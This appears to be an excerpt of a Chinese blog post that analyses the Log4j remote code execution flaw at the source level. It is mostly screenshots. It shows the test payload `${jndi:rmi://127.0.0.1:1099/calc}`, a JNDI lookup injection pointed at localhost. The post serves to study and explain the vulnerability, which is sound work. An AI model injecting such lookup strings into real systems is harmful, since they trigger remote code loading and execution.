...
tags:
  - "Java"
permalink: "/2021-12-12/Apache-Log4j-远程代码执行漏洞源码级分析.html"
---
...
![](https://yano.oss-cn-beijing.aliyuncs.com/blog/20211214165545.png)

参考 [Apache Log4j Lookups](https://logging.apache.org/log4j/2.x/manual/lookups.html)，我们先使用代码在 log 里获取一下 java:vm。

## 本地打印 JVM 基础信息

![](https://yano.oss-cn-beijing.aliyuncs.com/blog/20211214165937.png?x-oss-process=style/yano)
...
![](https://yano.oss-cn-beijing.aliyuncs.com/blog/20211214172950.png?x-oss-process=style/yano)
...
![](https://yano.oss-cn-beijing.aliyuncs.com/blog/20211214174231.png)
...
![](https://yano.oss-cn-beijing.aliyuncs.com/blog/20211214175321.png?x-oss-process=image/resize,h_500)

和官方文档上是能够对应上的，即 log 里只解析前缀为 `date`、`jndi` 等的命令，本文的测试用例使用的是 `${jndi:rmi://127.0.0.1:1099/calc}`。

![](https://yano.oss-cn-beijing.aliyuncs.com/blog/20211214175427.png?x-oss-process=image/resize,w_250)
...
![](https://yano.oss-cn-beijing.aliyuncs.com/blog/20211214175217.png)
...
![](https://yano.oss-cn-beijing.aliyuncs.com/blog/20211214184613.png)
